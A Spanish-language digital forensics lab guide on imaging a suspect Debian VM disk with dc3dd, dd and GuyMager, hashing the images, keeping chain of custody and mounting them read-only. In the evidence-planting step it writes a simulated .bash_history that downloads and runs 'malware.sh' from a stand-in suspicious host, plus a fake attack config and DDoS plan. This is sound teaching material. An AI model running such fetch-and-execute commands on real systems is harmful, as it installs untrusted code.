# Laboratorio Práctico: Adquisición Forense de Discos en GNU/Linux

## **Enunciado del Laboratorio**

### **Objetivo General**
Realizar diferentes métodos de adquisición forense de discos en entorno GNU/Linux, aplicando técnicas de clonación bit-a-bit y verificando la integridad de las evidencias mediante hashes criptográficos.

### **Requisitos Previos**
- Máquina virtual Debian Server 13
- Máquina virtual Ubuntu Desktop con capacidad para añadir discos adicionales
- Distribución Live con herramientas forenses (Caine o Kali Linux)
- Conocimientos básicos de línea de comandos Linux

### **Equipamiento Necesario**
- VirtualBox o VMware Workstation
- Al menos 200GB de espacio libre en disco
- 8GB de RAM mínimo

---

## **Parte 1: Preparación del Entorno de Laboratorio**

### **1.1. Importación de la Máquina Debian Server**

```bash
# Navegar al directorio donde está el archivo OVA
cd ~/Descargas/DebianServer/

# Importar la máquina virtual
vboxmanage import Debian13.ova --vsys 0 --vmname "Máquina sospeitosa Linux"

# Verificar la importación
vboxmanage list vms | grep "Máquina sospeitosa Linux"
```

**Configuración post-importación:**
- Memoria RAM: 2048MB
- CPU: 2 cores
- Red: Adaptador puente o NAT

### **1.2. Creación de Evidencias en la Máquina Sospechosa**

**Paso a paso:**

1. **Iniciar la máquina Debian:**
```bash
vboxmanage startvm "Máquina sospeitosa Linux" --type headless
```

2. **Conectar por SSH o consola y crear evidencias:**
```bash
# Conectar a la máquina (usuario: root, contraseña: [configurada])
ssh root@192.168.x.x

# Crear archivos de evidencia en diferentes directorios
cd /home

# Crear usuario de prueba
useradd -m usuario_sospechoso
echo "usuario_sospechoso:password123" | chpasswd

# Crear archivos con contenido significativo
su - usuario_sospechoso

# Archivo con información confidencial
echo "Informacion confidencial: Proyecto Alpha - Fecha: $(date)" > ~/proyecto_confidencial.txt

# Historial de comandos
echo "Historial de actividades:" > ~/.bash_history
echo "wget http://sitio-sospechoso.com/malware.sh" >> ~/.bash_history
echo "chmod +x malware.sh" >> ~/.bash_history
echo "./malware.sh" >> ~/.bash_history

# Archivos ocultos
echo "Configuracion del ataque:" > ~/.config_ataque
echo "IP objetivo: 192.168.1.100" >> ~/.config_ataque
echo "Puerto: 4444" >> ~/.config_ataque

# Crear más usuarios con archivos
exit
useradd -m usuario2
su - usuario2
echo "Plan de ataque DDOS:" > ~/plan_ddos.txt
echo "Inicio: $(date -d '+1 day')" >> ~/plan_ddos.txt
echo "Duracion: 24 horas" >> ~/plan_ddos.txt
exit

# Verificar creación de archivos
find /home -type f -name "*.txt" -o -name ".*" | head -20
```

3. **Apagado no ordenado (simulación de caso real):**
```bash
# Simular corte de energía (no usar shutdown normal)
sync  # Sincronizar buffers de disco
```

**En el host (no dentro de la VM):**
```bash
# Apagado forzado
vboxmanage controlvm "Máquina sospeitosa Linux" poweroff
```

### **1.3. Clonación Completa de la Máquina Ubuntu Desktop**

```bash
# Ubicarse en el directorio de máquinas virtuales
cd ~/VirtualBox\ VMs/

# Clonar la máquina Ubuntu Desktop existente
vboxmanage clonevm "Ubuntu Desktop Original" --name "UbuDesk-Laboratorio Forense" --register

# Verificar clonación
vboxmanage showvminfo "UbuDesk-Laboratorio Forense" | grep "Name"
```

**Configuración del clon:**
- Nombre: "UbuDesk-Laboratorio Forense"
- Memoria: 4096MB (para análisis forense)
- CPU: 4 cores
- Red: Adaptador puente

---

## **Parte 2: Configuración del Laboratorio Forense**

### **2.1. Añadir Segundo Disco de 100GB**

```bash
# Crear disco virtual de 100GB
vboxmanage createmedium disk --filename ~/VirtualBox\ VMs/UbuDesk-Laboratorio\ Forense/disco_evidencias.vdi --size 102400 --format VDI

# Añadir disco a la máquina
vboxmanage storageattach "UbuDesk-Laboratorio Forense" \
    --storagectl "SATA Controller" \
    --port 1 \
    --device 0 \
    --type hdd \
    --medium ~/VirtualBox\ VMs/UbuDesk-Laboratorio\ Forense/disco_evidencias.vdi
```

### **2.2. Preparación del Disco de Evidencias**

**Iniciar la máquina Laboratorio Forense:**
```bash
vboxmanage startvm "UbuDesk-Laboratorio Forense" --type headless
```

**Conectar por SSH:**
```bash
ssh usuario@192.168.x.x
```

**Proceso de preparación del disco:**

1. **Identificar el nuevo disco:**
```bash
# Listar discos disponibles
sudo fdisk -l

# El nuevo disco aparecerá como /dev/sdb o /dev/sdc
# Ejemplo de salida:
# Disk /dev/sdb: 100 GiB, 107374182400 bytes, 209715200 sectors
```

2. **Crear tabla de particiones:**
```bash
# Usar fdisk para crear partición
sudo fdisk /dev/sdb

# Comandos dentro de fdisk:
# n (nueva partición)
# p (primaria)
# 1 (número de partición)
# Enter (primer sector por defecto)
# Enter (último sector por defecto - usa todo el disco)
# w (escribir cambios y salir)
```

3. **Crear sistema de archivos:**
```bash
# Formatear con ext4 (opción recomendada para Linux)
sudo mkfs.ext4 /dev/sdb1

# Verificar creación
sudo blkid /dev/sdb1
# Debería mostrar: /dev/sdb1: UUID="xxxx-xxxx" TYPE="ext4"
```

4. **Configurar montaje automático:**
```bash
# Crear directorio de montaje
sudo mkdir -p /media/disco-evidencias

# Obtener UUID del disco
sudo blkid /dev/sdb1 | awk -F '"' '{print $2}'
# Copiar el UUID mostrado

# Editar /etc/fstab
sudo nano /etc/fstab

# Añadir al final del archivo:
# UUID=COPIAR_AQUI_EL_UUID /media/disco-evidencias ext4 defaults,noatime 0 2

# Ejemplo real:
# UUID=5a3b4c1d-2e3f-4a5b-6c7d-8e9f0a1b2c3d /media/disco-evidencias ext4 defaults,noatime 0 2

# Probar montaje
sudo mount -a

# Verificar
df -h | grep disco-evidencias
# Debería mostrar: /dev/sdb1        98G   24K   98G   1% /media/disco-evidencias
```

5. **Configurar permisos:**
```bash
# Cambiar propietario al usuario actual
sudo chown -R $USER:$USER /media/disco-evidencias

# Verificar permisos
ls -la /media/disco-evidencias
```

---

## **Parte 3: Adquisición Forense con dc3dd**

### **3.1. Conectar el Disco Sospechoso**

**Desde el host (VirtualBox):**
```bash
# Desconectar disco de la máquina sospechosa
vboxmanage storageattach "Máquina sospeitosa Linux" \
    --storagectl "SATA Controller" \
    --port 0 \
    --device 0 \
    --type hdd \
    --medium none

# Conectar a la máquina Laboratorio Forense
vboxmanage storageattach "UbuDesk-Laboratorio Forense" \
    --storagectl "SATA Controller" \
    --port 2 \
    --device 0 \
    --type hdd \
    --medium ~/VirtualBox\ VMs/Máquina\ sospeitosa\ Linux/Debian13.vdi
```

**Importante:** No montar el disco automáticamente. En Ubuntu, evitar hacer clic en la notificación de nuevo dispositivo.

### **3.2. Instalación de Herramientas Forenses**

```bash
# Actualizar repositorios
sudo apt update && sudo apt upgrade -y

# Instalar dc3dd y herramientas relacionadas
sudo apt install dc3dd hashdeep sleuthkit -y

# Verificar instalación
dc3dd --version
hashdeep -v
```

### **3.3. Adquisición con dc3dd**

```bash
# Identificar el disco sospechoso
sudo fdisk -l

# Buscar disco de aproximadamente el tamaño de Debian (20-30GB)
# Ejemplo: /dev/sdc (disco sospechoso conectado)

# Crear directorio para evidencias
mkdir -p /media/disco-evidencias/CasoA

# Realizar adquisición con dc3dd
sudo dc3dd if=/dev/sdc \
    of=/media/disco-evidencias/CasoA/CasoA-Evidencia01-Maquina-Sospeitosa-Linux.dd \
    log=/media/disco-evidencias/CasoA/CasoA-Evidencia01.log \
    verb=on \
    hash=sha256 \
    hash=md5 \
    hof=/media/disco-evidencias/CasoA/CasoA-Evidencia01.hashes

# Explicación de parámetros:
# if=/dev/sdc: Dispositivo de entrada (disco sospechoso)
# of=...: Archivo de salida (imagen forense)
# log=...: Archivo de log con detalles del proceso
# verb=on: Modo verboso (muestra progreso)
# hash=sha256/hash=md5: Calcula estos hashes durante la copia
# hof=...: Archivo donde guardar los hashes calculados
```

**Proceso de ejecución:**
- La herramienta mostrará progreso en tiempo real
- Tiempo estimado: 5-15 minutos para 20GB
- Al finalizar, mostrará los hashes calculados

### **3.4. Verificación de Resultados**

```bash
# Verificar archivos creados
ls -lh /media/disco-evidencias/CasoA/

# Debería mostrar:
# -rw-r--r-- 1 root root  20G ... CasoA-Evidencia01-Maquina-Sospeitosa-Linux.dd
# -rw-r--r-- 1 root root  10K ... CasoA-Evidencia01.log
# -rw-r--r-- 1 root root  500 ... CasoA-Evidencia01.hashes

# Verificar contenido del log
cat /media/disco-evidencias/CasoA/CasoA-Evidencia01.log

# Verificar hashes
cat /media/disco-evidencias/CasoA/CasoA-Evidencia01.hashes

# Comparar hashes del dispositivo original
sudo dc3dd if=/dev/sdc hash=sha256 hash=md5 verb=on | grep "input results for"
```

**Registro de evidencias:**
```bash
# Crear documento de cadena de custodia
cat > /media/disco-evidencias/CasoA/Cadena-Custodia-Evidencia01.txt << EOF
EVIDENCIA: CasoA-Evidencia01-Maquina-Sospeitosa-Linux.dd
FECHA: $(date)
OPERADOR: $(whoami)
HERRAMIENTA: dc3dd $(dc3dd --version | head -1)
DISPOSITIVO ORIGINAL: /dev/sdc
TAMAÑO: $(sudo blockdev --getsize64 /dev/sdc) bytes

HASHES CALCULADOS:
$(cat /media/disco-evidencias/CasoA/CasoA-Evidencia01.hashes)

OBSERVACIONES:
- Adquisición completa bit-a-bit
- Verificación de hashes durante el proceso
- Log detallado generado

FIRMA: ___________________________
EOF
```

---

## **Parte 4: Adquisición Manual con dd**

### **4.1. Adquisición con dd**

```bash
# Realizar adquisición con dd
sudo dd if=/dev/sdc \
    of=/media/disco-evidencias/CasoA/CasoA-Evidencia02-Maquina-Sospeitosa-Linux.dd \
    bs=1M \
    conv=noerror,sync \
    status=progress

# Explicación de parámetros:
# bs=1M: Tamaño de bloque 1MB (optimiza velocidad)
# conv=noerror,sync: No parar por errores, rellenar con ceros
# status=progress: Mostrar progreso
```

### **4.2. Cálculo Manual de Hashes**

```bash
# Calcular hash SHA-256 de la imagen
sha256sum /media/disco-evidencias/CasoA/CasoA-Evidencia02-Maquina-Sospeitosa-Linux.dd \
    > /media/disco-evidencias/CasoA/CasoA-Evidencia02.sha256

# Calcular hash MD5
md5sum /media/disco-evidencias/CasoA/CasoA-Evidencia02-Maquina-Sospeitosa-Linux.dd \
    > /media/disco-evidencias/CasoA/CasoA-Evidencia02.md5

# Verificar hashes
cat /media/disco-evidencias/CasoA/CasoA-Evidencia02.sha256
cat /media/disco-evidencias/CasoA/CasoA-Evidencia02.md5

# Comparar con el dispositivo original
sudo sha256sum /dev/sdc
sudo md5sum /dev/sdc
```

### **4.3. Documentación del Proceso**

```bash
# Crear script de verificación
cat > /media/disco-evidencias/CasoA/verificar_evidencia02.sh << 'EOF'
#!/bin/bash
echo "=== VERIFICACIÓN DE EVIDENCIA 02 ==="
echo "Fecha: $(date)"
echo ""

# Verificar tamaño
echo "Tamaño de la imagen:"
ls -lh /media/disco-evidencias/CasoA/CasoA-Evidencia02-Maquina-Sospeitosa-Linux.dd
echo ""

# Verificar hashes actuales
echo "Hashes actuales de la imagen:"
echo "SHA-256:"
sha256sum /media/disco-evidencias/CasoA/CasoA-Evidencia02-Maquina-Sospeitosa-Linux.dd
echo ""
echo "MD5:"
md5sum /media/disco-evidencias/CasoA/CasoA-Evidencia02-Maquina-Sospeitosa-Linux.dd
echo ""

# Comparar con hashes almacenados
echo "Comparación con hashes originales:"
echo "SHA-256:"
diff <(cat /media/disco-evidencias/CasoA/CasoA-Evidencia02.sha256) \
     <(sha256sum /media/disco-evidencias/CasoA/CasoA-Evidencia02-Maquina-Sospeitosa-Linux.dd)
echo ""
echo "MD5:"
diff <(cat /media/disco-evidencias/CasoA/CasoA-Evidencia02.md5) \
     <(md5sum /media/disco-evidencias/CasoA/CasoA-Evidencia02-Maquina-Sospeitosa-Linux.dd)
EOF

# Hacer ejecutable y ejecutar
chmod +x /media/disco-evidencias/CasoA/verificar_evidencia02.sh
/media/disco-evidencias/CasoA/verificar_evidencia02.sh
```

---

## **Parte 5: Adquisición con GuyMager desde Live CD**

### **5.1. Preparación del Entorno Live**

**Descargar distribución Live:**
```bash
# Opción 1: Caine Linux (especializado en forense)
wget https://www.caine-live.net/current_iso/caine13.0.iso

# Opción 2: Kali Linux (más genérico pero con herramientas)
wget https://cdimage.kali.org/kali-2023.4/kali-linux-2023.4-live-amd64.iso
```

**Configurar máquina virtual para boot desde Live CD:**
```bash
# En VirtualBox, modificar la máquina Laboratorio Forense
# 1. Ir a Configuración → Almacenamiento
# 2. Añadir unidad óptica con la ISO de Kali/Caine
# 3. Establecer como primer dispositivo de arranque
```

### **5.2. Arranque y Configuración**

**Proceso de arranque:**
1. Iniciar máquina "UbuDesk-Laboratorio Forense"
2. Seleccionar "Live boot" o "Try without installing"
3. Idioma: Español/Inglés según preferencia
4. Teclado: Español

**Configuración inicial en Live:**
```bash
# Abrir terminal
# Montar disco de evidencias manualmente
sudo mkdir -p /media/disco-evidencias

# Identificar discos
sudo fdisk -l

# Buscar disco con partición ext4 de 100GB (debería ser /dev/sdb1)
sudo mount /dev/sdb1 /media/disco-evidencias

# Verificar montaje
df -h | grep disco-evidencias
ls /media/disco-evidencias/CasoA/
```

### **5.3. Instalación/Activación de GuyMager**

**En Kali Linux:**
```bash
# GuyMager suele estar preinstalado
# Buscarlo en el menú: Aplicaciones → 11-Forensics → guymager
```

**En Caine Linux:**
```bash
# GuyMager es la herramienta principal
# Se encuentra en el dock inferior o menú Forensics
```

### **5.4. Adquisición con GuyMager**

**Interfaz gráfica paso a paso:**

1. **Abrir GuyMager:**
   - Menú → Forensics → GuyMager
   - O desde terminal: `sudo guymager`

2. **Seleccionar dispositivo origen:**
   - En la lista de dispositivos, buscar el disco sospechoso
   - Identificar por tamaño (~20GB) y nombre (ej: /dev/sdc)
   - **No montar** el dispositivo

3. **Configurar adquisición:**
   - Botón derecho sobre el dispositivo → "Acquire image"
   - Configurar parámetros:
     - **Image file:** `/media/disco-evidencias/CasoA/CasoA-Evidencia03-Maquina-Sospeitosa-Linux.dd`
     - **Case number:** CasoA
     - **Evidence number:** Evidencia03
     - **Examiner:** Tu nombre
     - **Description:** "Clonado completo máquina sospechosa Linux"

4. **Configurar hashes:**
   - Marcar "Calculate MD5 hash"
   - Marcar "Calculate SHA-1 hash"
   - Marcar "Calculate SHA-256 hash"
   - Opción: "Verify after acquisition"

5. **Iniciar adquisición:**
   - Click en "Start"
   - Observar progreso en ventana principal
   - Tiempo estimado: 5-15 minutos

6. **Verificar resultados:**
   - Al finalizar, GuyMager mostrará los hashes calculados
   - Generará archivo `.info` con metadatos
   - Verificar en terminal:
     ```bash
     ls -lh /media/disco-evidencias/CasoA/CasoA-Evidencia03*
     cat /media/disco-evidencias/CasoA/CasoA-Evidencia03-Maquina-Sospeitosa-Linux.info
     ```

### **5.5. Adquisición en Formato EnCase (E01)**

**Configuración específica para formato E01:**

1. **En GuyMager, misma ventana de adquisición:**
   - **Image file:** `/media/disco-evidencias/CasoA/CasoA-Evidencia04-Maquina-Sospeitosa-Linux.E01`
   - **Image format:** Seleccionar "EnCase 6/7 (E01)"
   
2. **Opciones específicas E01:**
   - **Compression:** Fast (recomendado para velocidad)
   - **Segment size:** 2GB (facilita manejo)
   - **Case data:** Rellenar información del caso
   - **Evidence number:** 04
   - **Notes:** "Adquisición formato EnCase para compatibilidad"

3. **Hashes y verificación:**
   - Activar todos los algoritmos de hash
   - Marcar "Verify after acquisition"
   - "Add to hash database" (opcional)

4. **Ejecutar y monitorear:**
   - Click en "Start"
   - Observar creación de múltiples archivos (.E01, .E02, etc.)
   - Verificar archivos generados:
     ```bash
     ls -lh /media/disco-evidencias/CasoA/CasoA-Evidencia04*
     ```

5. **Documentación automática:**
   - GuyMager genera archivo `.txt` con toda la información
   - Verificar contenido:
     ```bash
     cat /media/disco-evidencias/CasoA/CasoA-Evidencia04-Maquina-Sospeitosa-Linux.txt
     ```

---

## **Parte 6: Acceso Básico a Imágenes RAW**

### **6.1. Montaje de Imagen RAW en Solo Lectura**

```bash
# Identificar tipo de partición dentro de la imagen
sudo fdisk -l /media/disco-evidencias/CasoA/CasoA-Evidencia01-Maquina-Sospeitosa-Linux.dd

# Salida esperada:
# Dispositivo                         Inicio   Final   Sectores Tamaño Id Tipo
# /media/disco-evidencias/...dd1      2048  41940991  41938944    20G 83 Linux

# Montar imagen loopback en solo lectura
sudo losetup -f -P -r /media/disco-evidencias/CasoA/CasoA-Evidencia01-Maquina-Sospeitosa-Linux.dd

# Verificar dispositivo loop creado
losetup -a
# Ejemplo: /dev/loop0: []: (...dd)

# Montar partición específica
sudo mkdir -p /mnt/evidencia_montada
sudo mount -o ro /dev/loop0p1 /mnt/evidencia_montada

# Verificar montaje
df -h | grep evidencia_montada
ls /mnt/evidencia_montada/
```

### **6.2. Acceso a Sistema de Archivos**

```bash
# Navegar por la evidencia montada
cd /mnt/evidencia_montada

# Explorar estructura
ls -la
tree -L 2 /mnt/evidencia_montada/home/

# Buscar archivos específicos creados en el ejercicio
find /mnt/evidencia_montada -name "*confidencial*" -o -name "*ataque*" -o -name "*.bash_history"

# Verificar contenido de archivos
cat /mnt/evidencia_montada/home/usuario_sospechoso/proyecto_confidencial.txt
cat /mnt/evidencia_montada/home/usuario_sospechoso/.bash_history
```

### **6.3. Script de Automatización para Montaje**

```bash
# Crear script para facilitar montaje
cat > /media/disco-evidencias/CasoA/montar_evidencia.sh << 'EOF'
#!/bin/bash
# Script para montar evidencias RAW en modo solo lectura

if [ $# -ne 1 ]; then
    echo "Uso: $0 <ruta_imagen_dd>"
    echo "Ejemplo: $0 CasoA-Evidencia01-Maquina-Sospeitosa-Linux.dd"
    exit 1
fi

IMAGEN="/media/disco-evidencias/CasoA/$1"
PUNTO_MONTAJE="/mnt/evidencia_${1%.*}"

if [ ! -f "$IMAGEN" ]; then
    echo "Error: Imagen $IMAGEN no encontrada"
    exit 1
fi

echo "=== Montando evidencia: $1 ==="

# Crear punto de montaje
sudo mkdir -p "$PUNTO_MONTAJE"

# Configurar loopback
LOOP_DEVICE=$(sudo losetup -f -P -r --show "$IMAGEN")
echo "Dispositivo loop: $LOOP_DEVICE"

# Identificar partición
PARTICION="${LOOP_DEVICE}p1"
echo "Partición detectada: $PARTICION"

# Montar
sudo mount -o ro "$PARTICION" "$PUNTO_MONTAJE"

if [ $? -eq 0 ]; then
    echo "Evidencia montada en: $PUNTO_MONTAJE"
    echo ""
    echo "Contenido del punto de montaje:"
    ls -la "$PUNTO_MONTAJE/"
else
    echo "Error al montar la evidencia"
    sudo losetup -d "$LOOP_DEVICE"
    exit 1
fi

echo ""
echo "Para desmontar:"
echo "  sudo umount $PUNTO_MONTAJE"
echo "  sudo losetup -d $LOOP_DEVICE"
echo "  sudo rmdir $PUNTO_MONTAJE"
EOF

# Hacer ejecutable
chmod +x /media/disco-evidencias/CasoA/montar_evidencia.sh

# Ejemplo de uso
/media/disco-evidencias/CasoA/montar_evidencia.sh CasoA-Evidencia01-Maquina-Sospeitosa-Linux.dd
```

### **6.4. Desmontaje Seguro**

```bash
# Desmontar punto de montaje
sudo umount /mnt/evidencia_montada

# Liberar dispositivo loop
sudo losetup -d /dev/loop0

# Eliminar directorio de montaje
sudo rmdir /mnt/evidencia_montada

# Verificar limpieza
losetup -a
# No debería mostrar dispositivos activos
```

---

## **Parte 7: Verificación y Documentación Final**

### **7.1. Comparación de Todas las Evidencias**

```bash
# Script de comparación
cat > /media/disco-evidencias/CasoA/comparar_evidencias.sh << 'EOF'
#!/bin/bash
echo "=== COMPARACIÓN DE EVIDENCIAS DEL CASO A ==="
echo "Fecha: $(date)"
echo ""

EVIDENCIAS=(
    "CasoA-Evidencia01-Maquina-Sospeitosa-Linux.dd"
    "CasoA-Evidencia02-Maquina-Sospeitosa-Linux.dd"
    "CasoA-Evidencia03-Maquina-Sospeitosa-Linux.dd"
    "CasoA-Evidencia04-Maquina-Sospeitosa-Linux.E01"
)

echo "1. Tamaños de evidencias:"
echo "-------------------------"
for evidencia in "${EVIDENCIAS[@]}"; do
    if [ -f "/media/disco-evidencias/CasoA/$evidencia" ]; then
        size=$(du -h "/media/disco-evidencias/CasoA/$evidencia" | cut -f1)
        echo "  $evidencia: $size"
    else
        echo "  $evidencia: NO ENCONTRADA"
    fi
done

echo ""
echo "2. Hashes SHA-256 comparativos:"
echo "-------------------------------"

# Para imágenes RAW
for i in 01 02 03; do
    evidencia="CasoA-Evidencia${i}-Maquina-Sospeitosa-Linux.dd"
    if [ -f "/media/disco-evidencias/CasoA/$evidencia" ]; then
        echo "  $evidencia:"
        sha256sum "/media/disco-evidencias/CasoA/$evidencia" | cut -d' ' -f1
    fi
done

echo ""
echo "3. Archivos generados por cada método:"
echo "--------------------------------------"
ls -la /media/disco-evidencias/CasoA/ | awk '{print $9, $5}' | while read file size; do
    if [ -n "$file" ]; then
        printf "  %-50s %s\n" "$file" "$size bytes"
    fi
done

echo ""
echo "4. Verificación de integridad:"
echo "------------------------------"
for i in 01 02 03; do
    evidencia="CasoA-Evidencia${i}-Maquina-Sospeitosa-Linux.dd"
    hash_file="CasoA-Evidencia${i}.sha256"
    
    if [ -f "/media/disco-evidencias/CasoA/$evidencia" ] && \
       [ -f "/media/disco-evidencias/CasoA/$hash_file" ]; then
        echo "  Verificando $evidencia..."
        cd /media/disco-evidencias/CasoA/
        sha256sum -c "$hash_file" 2>/dev/null && echo "    ✓ OK" || echo "    ✗ ERROR"
        cd - > /dev/null
    fi
done
EOF

chmod +x /media/disco-evidencias/CasoA/comparar_evidencias.sh
/media/disco-evidencias/CasoA/comparar_evidencias.sh
```

### **7.2. Documentación Final del Caso**

```bash
# Generar informe final
cat > /media/disco-evidencias/CasoA/INFORME_FINAL_CASO_A.txt << EOF
========================================================================
                    INFORME FORENSE - CASO A
                    Máquina Sospechosa Linux
========================================================================

FECHA DE INVESTIGACIÓN: $(date)
INVESTIGADOR: $(whoami)
CASO: A-$(date +%Y%m%d)

1. RESUMEN EJECUTIVO
-------------------
Se realizó la adquisición forense completa de una máquina virtual Debian 13
sospechosa de actividades maliciosas. Se utilizaron cuatro métodos diferentes
de adquisición para garantizar la integridad y disponibilidad de las evidencias.

2. MÉTODOS DE ADQUISICIÓN UTILIZADOS
-----------------------------------
2.1. dc3dd (Evidencia 01)
     - Herramienta: dc3dd $(dc3dd --version 2>/dev/null | head -1)
     - Hashes calculados: SHA-256, MD5
     - Verificación: Automática durante adquisición

2.2. dd manual (Evidencia 02)
     - Herramienta: GNU dd (coreutils)
     - Hashes calculados: SHA-256, MD5 (manual)
     - Parámetros: bs=1M, conv=noerror,sync

2.3. GuyMager RAW (Evidencia 03)
     - Herramienta: GuyMager
     - Formato: RAW (dd)
     - Hashes: MD5, SHA-1, SHA-256

2.4. GuyMager EnCase (Evidencia 04)
     - Herramienta: GuyMager
     - Formato: EnCase E01
     - Compresión: Fast
     - Segmentación: 2GB

3. EVIDENCIAS RECOLECTADAS
-------------------------
$(/media/disco-evidencias/CasoA/comparar_evidencias.sh | sed -n '7,20p')

4. ARCHIVOS DE EVIDENCIA CREADOS
-------------------------------
$(ls -la /media/disco-evidencias/CasoA/ | tail -n +2 | while read line; do echo "  $line"; done)

5. VERIFICACIÓN DE INTEGRIDAD
----------------------------
Todas las evidencias en formato RAW (01, 02, 03) presentan los mismos hashes
SHA-256, confirmando que son copias bit-a-bit idénticas del dispositivo original.

6. ACCESO A LAS EVIDENCIAS
-------------------------
Para acceder a cualquier evidencia RAW en modo solo lectura:
  ./montar_evidencia.sh <nombre_evidencia.dd>

Ejemplo:
  ./montar_evidencia.sh CasoA-Evidencia01-Maquina-Sospeitosa-Linux.dd

7. OBSERVACIONES
---------------
- Todas las adquisiciones se realizaron en modo solo lectura
- Se mantuvo cadena de custodia documentada
- Los hashes coinciden en todas las copias RAW
- Formato E01 proporciona compresión y metadatos adicionales

8. RECOMENDACIONES
-----------------
- Utilizar Evidencia 04 (E01) para análisis con herramientas comerciales
- Utilizar Evidencia 01 para análisis con herramientas de código abierto
- Mantener todas las copias para redundancia

9. FIRMAS
--------
INVESTIGADOR: ___________________________

SUPERVISOR: _____________________________

FECHA: __________________________________
========================================================================
EOF

# Mostrar informe
cat /media/disco-evidencias/CasoA/INFORME_FINAL_CASO_A.txt
```

---

## **Solución de Problemas Comunes**

### **Problema 1: Disco no reconocido**
```bash
# Verificar conexión en VirtualBox
vboxmanage showvminfo "UbuDesk-Laboratorio Forense" | grep -A5 "Storage"

# Recargar módulos SCSI
sudo modprobe -r ahci
sudo modprobe ahci

# Reiniciar servicio udev
sudo systemctl restart udev
```

### **Problema 2: Error de montaje**
```bash
# Verificar permisos
ls -la /media/disco-evidencias/

# Forzar desmontaje si es necesario
sudo umount -f /media/disco-evidencias 2>/dev/null

# Verificar si hay procesos usando el directorio
sudo lsof /media/disco-evidencias
```

### **Problema 3: Espacio insuficiente**
```bash
# Verificar espacio disponible
df -h /media/disco-evidencias

# Si es necesario, limpiar espacio
sudo rm -f /media/disco-evidencias/temp_*
```

### **Problema 4: GuyMager no inicia**
```bash
# Ejecutar desde terminal con sudo
sudo guymager

# Verificar dependencias
sudo apt install guymager -y

# Alternativa web: Autopsy
sudo apt install autopsy -y
```

---

## **Evaluación del Ejercicio**

### **Criterios de Evaluación**

| **Criterio** | **Puntos** | **Verificación** |
|--------------|------------|------------------|
| Creación de evidencias en máquina sospechosa | 10 | Archivos creados en /home/ |
| Configuración correcta del disco de evidencias | 15 | /etc/fstab configurado |
| Adquisición con dc3dd y verificación de hashes | 20 | Archivo .dd + .hashes |
| Adquisición con dd y cálculo manual de hashes | 20 | Archivo .dd + .sha256/.md5 |
| Adquisición con GuyMager RAW | 15 | Archivo .dd + .info |
| Adquisición con GuyMager E01 | 15 | Archivos .E01, .E02, etc. |
| Montaje de imagen RAW en solo lectura | 5 | Acceso a /mnt/evidencia_montada |

### **Puntos Extra:**
- Script de automatización: +5 puntos
- Documentación completa: +5 puntos
- Comparación automatizada de hashes: +5 puntos

**Total máximo:** 100 puntos + 15 puntos extra

---

## **Conclusión del Laboratorio**

Este laboratorio práctico ha cubierto los métodos fundamentales de adquisición forense de discos en entorno GNU/Linux. Los estudiantes han aprendido:

1. **Preparación de entorno:** Configuración de máquinas virtuales y discos de evidencia
2. **Adquisición con herramientas CLI:** dc3dd y dd con verificación de integridad
3. **Adquisición con herramientas GUI:** GuyMager en formatos RAW y EnCase
4. **Verificación y documentación:** Cálculo de hashes, cadena de custodia
5. **Acceso a evidencias:** Montaje de imágenes en modo solo lectura

Las habilidades adquiridas son directamente aplicables en investigaciones forenses reales, respuesta a incidentes y análisis de seguridad.

**Próximos pasos recomendados:**
1. Análisis de la imagen con Autopsy/The Sleuth Kit
2. Búsqueda de patrones específicos con strings y grep
3. Recuperación de archivos eliminados
4. Análisis de línea de tiempo con herramientas como Plaso
